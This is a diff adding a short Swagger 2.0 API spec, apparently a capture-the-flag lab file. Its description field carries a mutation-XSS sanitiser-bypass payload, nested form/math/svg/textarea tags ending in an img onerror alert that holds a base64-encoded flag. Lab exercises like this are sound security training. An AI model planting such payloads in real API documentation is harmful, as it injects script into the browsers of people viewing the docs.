@@ -1,0 +1,16 @@
+swagger: '2.0'
+info:
+  title: Classic API Resource Documentation
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('VHJ5SGFja01le1hTUy1TdzRnZzNyfQ==') src=1>"></form>
+
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
